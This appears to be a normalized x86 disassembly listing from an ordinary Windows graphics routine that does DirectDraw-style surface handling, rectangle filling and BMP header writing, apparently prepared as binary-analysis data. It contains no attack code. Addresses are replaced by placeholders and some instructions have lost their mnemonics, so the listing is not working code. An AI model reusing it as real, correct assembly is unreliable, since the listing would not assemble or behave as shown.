jmp r-xdata
mov edx [ ebx + 0x430 ]
mov eax [ ebx + 0x434 ]
mov edi [ ebx + 0x42c ]
mov ecx ebx
mov [ esp + 0x1c ] edx
mov [ esp + 0x20 ] eax
call sub_435850
mov esi eax
mov eax [ ebx + 0x8 ]
test eax eax
jle r-xdata
mov ecx [ esp + 0x464 ]
mov [ esp + 0x18 ] ecx
lea edi [ eax - 0x1 ]
imul edi esi
add edi ebp
neg esi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
push 0x0
push 0x0
push 0x20000010
push edx
push eax
mov ecx ebx
call sub_4397d0
mov ebp eax
test ebp ebp
je r-xdata
dec eax
imul eax esi
add edi eax
neg esi
jmp r-xdata
mov ebp [ ebx + 0x42c ]
mov ecx ebx
call sub_435850
mov ecx [ esp + 0x18 ]
cmp ecx 0x2000000c
jg r-xdata
lea ecx [ esp + 0x24 ]
call sub_43a1f0
mov eax ebp
jmp r-xdata
cmp ecx 0x20000018
je r-xdata
je r-xdata
mov ecx [ esp + 0x14 ]
push eax
mov eax [ esp + 0x14 ]
push esi
push eax
push ecx
push ebp
push edi
call [ rw-data ]
cmp ecx 0x40000020
jne r-xdata
push eax
mov eax [ esp + 0x14 ]
inc eax
cdq
sub eax edx
sar eax 0x1
push esi
shl eax 0x1
push esi
push eax
mov eax [ esp + 0x24 ]
inc eax
cdq
sub eax edx
mov edx [ esp + 0x30 ]
sar eax 0x1
shl eax 0x1
push eax
mov eax [ esp + 0x30 ]
push ebp
push edx
push eax
push edi
call [ rw-data ]
jmp r-xdata
sub ecx 0x10000018
je r-xdata
lea ecx [ esp + 0x24 ]
call sub_43a1f0
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
push 0x0
push eax
push esi
push ecx
push edx
push ebp
push edi
call [ rw-data ]
jmp r-xdata
mov ecx [ esp + 0x14 ]
push 0x0
push eax
mov eax [ esp + 0x18 ]
push esi
push eax
push ecx
push ebp
push edi
call [ rw-data ]
jmp r-xdata
sub ecx 0x8
je r-xdata
sub ecx 0xfffffe8
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
push 0x0
push eax
push esi
push ecx
push edx
push ebp
push edi
call [ rw-data ]
jmp r-xdata
sub_43d170
push 0xffffffff
push sub_4c01f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov ecx rw-data
mov [ esp + 0x4 ] rw-data
call sub_404310
mov eax [ rw-data ]
xor esi esi
cmp eax esi
mov [ esp + 0x10 ] esi
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ rw-data ] esi
mov eax [ rw-data ]
cmp eax esi
je r-xdata
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
mov [ rw-data ] esi
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ rw-data ] esi
sub_43d200
push 0xffffffff
push sub_4c01f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov ecx rw-data
mov esi 0x80004005
mov [ esp + 0x4 ] rw-data
call sub_404310
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x10 ] 0x0
je r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ rw-data ]
push 0x0
and ecx 0xffffbfff
push 0x200
or ecx 0x200
mov [ rw-data ] ecx
mov ecx [ rw-data ]
mov edx [ eax ]
push 0x0
push ecx
push 0x0
push eax
call [ edx + 0x84 ]
mov esi eax
sub_43d2c0
push 0xffffffff
push sub_4c01f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov ecx rw-data
mov esi 0x80004005
mov [ esp + 0x4 ] rw-data
call sub_404310
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x10 ] 0x0
mov [ rw-data ] 0x6c
je r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ eax ]
push 0x0
push 0x0
push rw-data
push 0x0
push eax
call [ ecx + 0x64 ]
mov esi eax
test esi esi
je r-xdata
cmp esi 0x8876021c
je r-xdata
mov eax [ rw-data ]
mov ecx [ eax ]
push 0x0
push 0x0
push rw-data
push 0x0
push eax
call [ ecx + 0x64 ]
mov esi eax
test esi esi
jne r-xdata
cmp esi 0x887601ae
je r-xdata
cmp esi 0x887601c2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
push eax
call [ edx + 0x6c ]
sub_43d380
push 0xffffffff
push sub_4c0278
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
mov ecx rw-data
mov esi 0x80004005
mov [ esp + 0x8 ] rw-data
call sub_404310
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
mov [ esp + 0x34 ] ebx
je r-xdata
mov ecx rw-data
mov [ rw-data ] ebx
call sub_401420
mov ecx [ esp + 0x2c ]
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x30
retn
mov ecx [ eax ]
push edi
push ebx
push eax
call [ ecx + 0x80 ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov edx eax
sub edx ecx
mov [ esp + 0x28 ] edx
mov edx [ rw-data ]
mov edi edx
sub edi esi
mov [ esp + 0x14 ] esi
mov esi [ GetSystemMetrics@IAT ]
push ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x30 ] edi
mov [ esp + 0x14 ] ecx
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] edx
call esi
push 0x1
mov edi eax
call esi
mov ecx [ esp + 0x10 ]
cmp ecx ebx
jge r-xdata
mov ecx [ esp + 0x18 ]
cmp ecx edi
jle r-xdata
sub [ esp + 0x20 ] ecx
mov [ esp + 0x10 ] ebx
mov ecx [ esp + 0x14 ]
cmp ecx ebx
pop edi
jge r-xdata
mov edx edi
sub edx ecx
add [ esp + 0x28 ] edx
mov [ esp + 0x18 ] edi
mov ecx [ esp + 0x18 ]
cmp ecx eax
jle r-xdata
sub [ esp + 0x20 ] ecx
mov [ esp + 0x10 ] ebx
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ eax ]
push rw-data
push edx
lea edx [ esp + 0x14 ]
push edx
mov edx [ rw-data ]
push edx
lea edx [ esp + 0x2c ]
push edx
push eax
call [ ecx + 0x84 ]
mov esi eax
mov edx eax
sub edx ecx
add [ esp + 0x28 ] edx
mov [ esp + 0x18 ] eax
sub_43d4c0
push 0xffffffff
push sub_4c0278
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push ebp
push esi
mov ecx rw-data
push edi
mov [ esp + 0x10 ] 0x80004005
mov [ esp + 0x14 ] ecx
call sub_404310
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x40 ] 0x0
je r-xdata
mov ecx rw-data
call sub_401420
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
add esp 0x34
retn
mov eax [ esp + 0x54 ]
test eax eax
jne r-xdata
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ esp + 0x18 ] ecx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x1c ] edx
mov edx [ eax + 0xc ]
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] edx
mov eax [ rw-data ]
mov ebp [ rw-data ]
mov ecx [ rw-data ]
mov edi [ rw-data ]
sub eax ebp
push eax
sub ecx edi
push ecx
push 0x0
push 0x0
lea edx [ esp + 0x28 ]
push edx
call [ SetRect@IAT ]
jmp r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x38 ]
pop edi
pop esi
pop ebp
mov eax 0x80004005
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x34
retn
mov edx [ esp + 0x2c ]
cmp edx edi
jge r-xdata
mov ecx [ esp + 0x1c ]
mov ebx [ rw-data ]
mov edi [ rw-data ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x18 ]
mov esi [ rw-data ]
mov ebp [ rw-data ]
mov [ esp + 0x2c ] ecx
mov ecx [ esp + 0x50 ]
push ecx
sub edi ebx
mov ebx [ esp + 0x50 ]
mov [ esp + 0x34 ] edx
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x28 ]
push ebx
lea edx [ esp + 0x30 ]
push edx
sub esi ebp
mov [ esp + 0x40 ] eax
call [ OffsetRect@IAT ]
mov eax [ esp + 0x28 ]
cmp eax esi
jge r-xdata
mov ecx [ esp + 0x30 ]
test ecx ecx
jle r-xdata
mov ebp [ esp + 0x34 ]
test ebp ebp
jle r-xdata
test eax eax
jge r-xdata
cmp ecx esi
jle r-xdata
sub [ esp + 0x18 ] eax
mov ebp [ esp + 0x34 ]
mov [ esp + 0x28 ] 0x0
test edx edx
jge r-xdata
mov eax esi
sub eax ecx
add [ esp + 0x20 ] eax
mov [ esp + 0x30 ] esi
cmp ebp edi
jle r-xdata
sub [ esp + 0x1c ] edx
mov [ esp + 0x2c ] 0x0
mov eax [ rw-data ]
test ah 0x8
je r-xdata
mov eax [ esp + 0x24 ]
mov ecx edi
sub ecx ebp
add eax ecx
mov [ esp + 0x24 ] eax
mov [ esp + 0x34 ] edi
test bl 0x1
jne r-xdata
mov ebx [ esp + 0x48 ]
push ebx
call [ GetDC@IAT ]
push 0xa000a
mov edi eax
call [ CreateSolidBrush@IAT ]
mov ebp eax
push ebp
lea edx [ esp + 0x1c ]
push edx
push edi
call [ FillRect@IAT ]
push ebp
call [ DeleteObject@IAT ]
push edi
push ebx
call [ ReleaseDC@IAT ]
mov ebx [ esp + 0x4c ]
mov ecx [ esp + 0x20 ]
mov eax ecx
and eax 0x1
add ecx eax
mov eax [ esp + 0x18 ]
mov edx eax
and edx 0x1
add eax edx
mov edx [ esp + 0x50 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x1c ]
push edx
mov [ esp + 0x30 ] eax
mov [ esp + 0x24 ] ecx
mov [ esp + 0x34 ] ecx
mov ecx [ esp + 0x28 ]
push ebx
lea eax [ esp + 0x30 ]
push eax
mov [ esp + 0x40 ] ecx
call [ OffsetRect@IAT ]
mov eax [ esp + 0x28 ]
cmp eax esi
jge r-xdata
mov ecx [ esp + 0x30 ]
test ecx ecx
jle r-xdata
test eax eax
jge r-xdata
cmp ecx esi
jle r-xdata
sub [ esp + 0x18 ] eax
mov [ esp + 0x28 ] 0x0
mov eax [ rw-data ]
mov ecx [ eax ]
push 0x0
push 0x1000000
lea edx [ esp + 0x20 ]
push edx
push eax
lea edx [ esp + 0x38 ]
push edx
push eax
call [ ecx + 0x14 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x20 ]
mov edx esi
sub edx ecx
add eax edx
mov [ esp + 0x20 ] eax
mov [ esp + 0x30 ] esi
sub_43d760
sub esp 0x8
push ebx
push esi
mov esi ecx
call sub_439ed0
mov eax [ esi + 0x1c ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x18 ]
cmp eax ebx
je r-xdata
push eax
call [ DeleteDC@IAT ]
mov [ esi + 0x1c ] ebx
push edi
xor eax eax
mov ecx 0xa
lea edi [ esi + 0x24 ]
mov [ esi + 0x20 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x44c ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
[ edi ]
dec [ esi + 0x8 ]
pop edi
jne r-xdata
push eax
call [ DeleteObject@IAT ]
mov [ esi + 0x18 ] ebx
cmp [ esi + 0x8 ] ebx
jge r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebx
mov [ esi + 0x8 ] ebx
je r-xdata
mov [ esi + 0x8 ] ebx
push eax
call [ LocalUnlock@IAT ]
mov [ esi + 0x20 ] ebx
mov eax [ esi + 0xd30 ]
cmp eax ebx
je r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
add esp 0x8
retn
push eax
call j_sub_4b66ed
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
add esp 0x4
push eax
push ecx
push ebx
lea ecx [ esi + 0xd38 ]
mov [ esi + 0xd30 ] ebx
call sub_43a5f0
sub_43d820
push ebp
mov ebp esp
push 0xffffffff
push sub_4c02bb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x24a0
call sub_4b6180
push ebx
push esi
push edi
mov esi ecx
xor edi edi
cmp esi edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x24 ] esi
je r-xdata
mov al [ ebp + 0x14 ]
test al al
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x20 ] edi
je r-xdata
cmp [ esi + 0x8 ] edi
jne r-xdata
mov eax [ esi + 0x20 ]
cmp eax edi
jne r-xdata
mov eax [ esi + 0x458 ]
cmp eax edi
je r-xdata
inc [ esi + 0x8 ]
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
mov ecx [ esi + 0x14 ]
mov ebx [ esi + 0x10 ]
mov [ ebp + 0x14 ] ecx
mov ecx esi
mov [ ebp - 0x1c ] eax
call sub_40b280
mov ecx esi
mov [ ebp - 0x18 ] eax
call sub_40b2d0
mov edx eax
mov eax [ esi + 0xc ]
lea edi [ esi + 0x24 ]
dec [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi + 0x454 ]
mov ebx [ esi + 0x450 ]
mov [ ebp - 0x1c ] eax
mov eax [ esi + 0x884 ]
cmp eax edi
mov [ ebp + 0x14 ] ecx
jne r-xdata
push eax
call [ LocalLock@IAT ]
mov [ esi + 0x20 ] eax
cmp [ ebp + 0xc ] 0x3
jne r-xdata
lea ecx [ ebp - 0x518 ]
call sub_43a1f0
dec [ esi + 0x8 ]
jne r-xdata
cmp [ esi + 0x8 ] edi
jge r-xdata
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ edx ]
mov edx [ eax + 0x18 ]
add edx ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov eax [ ebp - 0xbc ]
test eax eax
mov ecx 0x10a
lea esi [ ebp - 0x518 ]
lea edi [ ebp - 0x940 ]
[ edi ] [ esi ]
mov ecx [ ebp - 0xec ]
mov esi [ ebp - 0xd8 ]
mov [ ebp + 0x18 ] ecx
mov [ ebp - 0x18 ] esi
jne r-xdata
lea ecx [ ebp - 0x518 ]
call sub_439d00
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jge r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x30
mov [ esi + 0x8 ] edi
push eax
call [ LocalUnlock@IAT ]
mov [ esi + 0x20 ] edi
mov ecx [ eax + 0x4 ]
mov eax [ eax + 0x1c ]
mov ecx [ ecx ]
lea edx [ eax + ecx ]
mov eax [ esi + 0x44c ]
lea edi [ esi + 0x45c ]
jmp r-xdata
mov eax [ esi + 0x44c ]
xor edx edx
lea edi [ esi + 0x45c ]
jmp r-xdata
cmp eax edi
jne r-xdata
mov edx [ eax + 0xc ]
mov [ ebp - 0x14 ] edx
movzx eax [ ebp - 0x50a ]
imul eax [ ebp - 0x514 ]
add eax 0x7
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0x3
and eax 0xfffffffc
mov [ ebp - 0x14 ] eax
jmp r-xdata
lea ecx [ ebp - 0x518 ]
call sub_43a1f0
lea ecx [ ebp - 0x24 ]
call sub_435880
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x30
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x30
mov [ esi + 0x8 ] 0x0
push eax
call [ LocalUnlock@IAT ]
mov [ esi + 0x20 ] 0x0
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0xc ]
test eax eax
setne cl
mov [ ebp - 0x14 ] cl
lea ecx [ ebp - 0x518 ]
call sub_439410
mov eax [ ebp + 0x18 ]
mov ecx [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x14 ]
push ecx
mov ecx [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x28 ]
push ebx
push 0x0
push 0x0
push edx
mov edx [ ebp - 0x1c ]
push ecx
push edx
push edi
push eax
lea ecx [ ebp - 0x518 ]
mov [ ebp - 0x4 ] 0x1
call sub_43ba10
test eax eax
je r-xdata
and esi 0xff
movzx esi [ ebp - 0x50a ]
jmp r-xdata
cmp esi 0x10000001
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x3
ja r-xdata
cmp [ ebp - 0x28 ] 0x40000020
jne r-xdata
cmp esi 0x20
mov [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp + 0x2c ]
xor edi edi
cmp eax edi
je r-xdata
mov ecx eax
jmp [ ecx * 4 + jump_table_43e1b8 ]
call sub_43abf0
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x2
je r-xdata
mov eax [ ebp - 0x1c ]
cmp eax edi
je r-xdata
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
push 0x1
call sub_43a9a0
add esp 0x4
test eax eax
je r-xdata
push 0x1
call sub_43aa90
add esp 0x4
test eax eax
je r-xdata
push 0x1
call sub_43a840
add esp 0x4
test eax eax
je r-xdata
mov eax esi
imul eax ebx
add eax 0x7
cdq
and edx 0x7
add eax edx
mov edi eax
sar edi 0x3
add edi 0x3
and edi 0xfffffffc
lea eax [ edi * 8 ]
cdq
idiv esi
xor ecx ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] cx
mov [ ebp - 0x38 ] 0x4d42
mov [ ebp - 0x2e ] 0x36
mov [ ebp - 0x93c ] eax
mov eax edi
imul eax [ ebp + 0x14 ]
add eax 0x36
cmp esi 0x8
mov [ ebp - 0x36 ] eax
jg r-xdata
mov esi [ ebp + 0x14 ]
lea edi [ ebx + ebx * 2 + 0xf ]
and edi 0xfffffff0
mov eax edi
imul eax esi
push eax
call j_sub_4b573e#2
add esp 0x4
test eax eax
mov [ ebp - 0x1c ] eax
jne r-xdata
lea ecx [ ebp - 0x518 ]
call sub_43a1f0
mov esi [ ebp - 0x24 ]
cmp esi edi
je r-xdata
push eax
call j_sub_4b66ed
add esp 0x4
lea edx [ ebp - 0x24b0 ]
push edx
mov [ ebp - 0x4 ] 0x2
call [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x20 ]
xor edi edi
xor eax eax
cmp ecx edi
mov [ ebp - 0x4 ] 0x4
je r-xdata
mov ecx [ ebp + 0x20 ]
xor edi edi
xor eax eax
cmp ecx edi
mov [ ebp - 0x4 ] 0x7
je r-xdata
mov eax [ ebp - 0x938 ]
test eax eax
jge r-xdata
mov edx 0x1
mov ecx esi
shl edx cl
shl edx 0x2
add eax edx
add edx 0x36
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x2e ] edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x18 ]
push edi
push ecx
push esi
mov esi [ ebp - 0x1c ]
push ebx
push esi
push edx
call [ rw-data ]
mov [ ebp - 0x14 ] edi
shl edi 0x3
mov eax 0x2aaaaaab
imul edi
sar edx 0x2
mov eax edx
shr eax 0x1f
mov [ ebp + 0x18 ] esi
mov esi 0x18
add edx eax
mov [ ebp - 0x18 ] 0x10000018
mov [ ebp - 0x932 ] si
mov [ ebp - 0x93c ] edx
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x30
dec [ esi + 0x8 ]
jne r-xdata
mov edx [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
mov edi [ ebp - 0x938 ]
mov eax esi
imul eax ebx
mov [ ebp - 0x24ac ] edx
cdq
and edx 0x7
add eax edx
mov [ ebp - 0x2480 ] ecx
mov ecx eax
mov eax [ ebp - 0x14 ]
sar ecx 0x3
neg edi
sub eax ecx
xor edx edx
cmp esi 0x8
mov [ ebp - 0x24a8 ] ebx
mov [ ebp - 0x24a4 ] edi
mov [ ebp - 0x2484 ] ebx
mov [ ebp - 0x24a0 ] eax
jne r-xdata
push r--data
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x54 ] r--data
call sub_4b5bd2
mov ecx [ ebp + 0x8 ]
push 0x6
push edi
push eax
mov eax [ ebp + 0x1c ]
push edi
push eax
push ecx
call sub_41c070
mov esi eax
add esp 0x18
cmp esi edi
je r-xdata
mov eax [ ecx ]
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x8 ]
push 0x6
push edi
push eax
push edi
push ecx
push edx
call sub_41c070
mov esi eax
add esp 0x18
cmp esi edi
je r-xdata
mov eax [ ecx ]
mov ecx [ ebp + 0x20 ]
xor eax eax
cmp ecx eax
mov [ ebp + 0x30 ] eax
mov [ ebp - 0x4 ] 0xa
je r-xdata
mov edx [ ebp + 0x14 ]
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x18 ]
dec edx
imul edx ecx
add ebx edx
neg ecx
neg eax
mov [ ebp + 0x18 ] ebx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x938 ] eax
cmp [ esi + 0x8 ] edi
jge r-xdata
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
mov ecx [ rw-data ]
cmp ecx 0x2
mov esi 0x3
mov eax esi
mov [ ebp - 0x249c ] eax
mov [ ebp - 0x247c ] esi
mov [ ebp - 0x2498 ] 0x2
mov [ ebp - 0x2478 ] esi
je r-xdata
mov eax 0x1
mov ecx 0x4
mov esi eax
mov [ ebp - 0x249c ] eax
mov [ ebp - 0x247c ] esi
mov [ ebp - 0x2498 ] ecx
mov [ ebp - 0x2478 ] ecx
mov [ ebp - 0x2494 ] edx
jmp r-xdata
mov [ ebp + 0xc ] esi
cmp esi edi
mov edx [ rw-data ]
mov ecx [ ebp + 0x28 ]
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x38 ] edx
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] ecx
lea ecx [ ebp - 0x38 ]
push ecx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x18 ]
lea edx [ ebp - 0x4c ]
push edx
push eax
lea ecx [ ebp - 0x940 ]
push ecx
push ecx
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x3c ] edi
mov [ ebp + 0x14 ] esp
mov eax esp
je r-xdata
inc [ esi + 0x4 ]
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x28 ]
mov [ ebp - 0x88 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x84 ] ecx
cmp [ rw-data ] edi
mov [ ebp - 0x7c ] eax
mov eax [ rw-data ]
setne dl
cmp eax edi
mov [ ebp - 0x4 ] 0x8
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x80 ] dl
jne r-xdata
inc [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
push 0x6
push 0x0
push eax
mov eax [ ebp + 0x1c ]
push 0x0
push eax
push ecx
call sub_41c070
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
mov eax [ ecx ]
mov [ esi + 0x8 ] edi
push eax
call [ LocalUnlock@IAT ]
mov [ esi + 0x20 ] edi
mov [ ebp - 0x2494 ] 0x0
cmp ecx 0x1
sete dl
inc edx
mov ecx [ rw-data ]
mov [ ebp - 0x2460 ] ecx
mov ecx [ rw-data ]
test ecx ecx
mov [ ebp - 0x2474 ] edx
je r-xdata
mov [ eax ] esi
call [ rw-data ]
mov [ ebp - 0x4 ] 0x4
inc [ esi + 0x4 ]
fild [ rw-data ]
fdivr [ r--data ]
fstp [ ebp - 0x78 ]
mov [ ebp - 0x78 ] 0x0
mov [ ebp - 0x74 ] 0x40590000
jmp r-xdata
mov [ ebp + 0xc ] ebx
mov edx [ ebx ]
push 0xe
lea eax [ ebp - 0x38 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0xb
call [ edx + 0x1c ]
mov edx [ ebx ]
push 0x28
lea eax [ ebp - 0x940 ]
push eax
mov ecx ebx
call [ edx + 0x1c ]
cmp esi 0x8
jg r-xdata
inc [ ebx + 0x4 ]
mov eax [ ebp + 0x8 ]
test eax eax
mov esi [ ebp + 0x20 ]
je r-xdata
mov ecx 0x1
mov [ ebp - 0x24b0 ] ecx
mov [ ebp - 0x974 ] ecx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x240c ] ecx
mov ecx [ ebp - 0x2478 ]
mov [ ebp - 0x242c ] eax
imul eax ebx
mov [ ebp - 0x2404 ] ecx
mov ecx [ ebp - 0x2488 ]
mov [ ebp - 0x2400 ] edx
mov edx [ ebp - 0x248c ]
mov [ ebp - 0x2414 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x2418 ] edx
mov edx [ ebp - 0x2490 ]
mov [ ebp - 0x243c ] ecx
mov ecx [ ebp - 0x24a0 ]
mov [ ebp - 0x241c ] edx
mov edx [ ebp - 0x2498 ]
add eax ecx
test edi edi
mov [ ebp - 0x2410 ] ebx
mov [ ebp - 0x2408 ] esi
mov [ ebp - 0x2438 ] ebx
mov [ ebp - 0x2434 ] edi
mov [ ebp - 0x2430 ] ecx
mov [ ebp - 0x2428 ] edx
mov [ ebp - 0x2424 ] 0x0
mov [ ebp - 0x2420 ] eax
jge r-xdata
test ebx ebx
jmp r-xdata
dec [ esi + 0x4 ]
jne r-xdata
mov [ eax ] esi
call [ rw-data ]
mov [ ebp - 0x4 ] 0x7
jmp r-xdata
inc [ esi + 0x4 ]
mov ecx [ rw-data ]
fild [ rw-data ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp - 0x18 ]
cmp ecx edi
fstp [ ebp - 0x68 ]
setne cl
cmp esi edi
mov [ ebp - 0x60 ] cl
lea ecx [ ebp - 0x88 ]
push ecx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x18 ]
lea edx [ ebp - 0x4c ]
push edx
push eax
lea ecx [ ebp - 0x940 ]
push ecx
push ecx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x3c ] edi
mov [ ebp + 0x14 ] esp
mov eax esp
je r-xdata
xor ebx ebx
mov edx [ ebx ]
mov ecx esi
mov eax 0x1
shl eax cl
lea ecx [ ebp - 0x918 ]
shl eax 0x2
push eax
push ecx
mov ecx ebx
call [ edx + 0x1c ]
mov eax [ esi ]
mov edx [ ebp + 0x1c ]
mov ecx 0x9
mov [ ebp - 0x2488 ] eax
mov [ ebp - 0x248c ] edx
mov [ ebp - 0x2414 ] eax
mov [ ebp - 0x2418 ] edx
mov ecx 0x8
mov [ ebp - 0x2490 ] eax
mov [ ebp - 0x241c ] eax
jmp r-xdata
mov eax [ ebp - 0x2468 ]
mov ecx [ ebp - 0x2464 ]
mov edx [ ebp - 0x2460 ]
mov [ ebp - 0x23f4 ] eax
mov [ ebp - 0x23f0 ] ecx
mov [ ebp - 0x23ec ] edx
neg eax
mov [ ebp - 0x2420 ] eax
jne r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
test ebx ebx
jmp r-xdata
cmp esi edi
mov ebx eax
je r-xdata
mov eax [ esi + 0x4 ]
dec eax
mov [ ebp - 0x4 ] 0xa
mov [ esi + 0x4 ] eax
jne r-xdata
test eax eax
je r-xdata
mov eax [ ebp + 0x30 ]
test eax eax
je r-xdata
mov [ ebp - 0x948 ] eax
mov eax [ ebp + 0x28 ]
or ecx 0x200
mov [ ebp - 0x944 ] eax
mov eax [ ebp + 0x24 ]
test eax eax
je r-xdata
mov [ ebp - 0x20 ] 0x1
mov eax [ ebp + 0x30 ]
test eax eax
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x18 ]
mov edx [ ecx ]
push edi
push esi
call [ edx + 0x1c ]
add esi [ ebp - 0x14 ]
mov [ ebp + 0x18 ] esi
inc ebx
jmp r-xdata
mov edx [ ebp + 0x28 ]
push edx
push ecx
push ebx
call eax
test eax eax
je r-xdata
push ecx
lea eax [ ebp - 0x24b0 ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
mov dx [ ebp + 0x34 ]
mov [ ebp - 0x950 ] eax
mov [ ebp - 0x94c ] dx
mov ecx [ ebp + 0x14 ]
cmp ebx ecx
mov eax [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
jge r-xdata
mov [ ebp + 0x30 ] 0x63
test esi esi
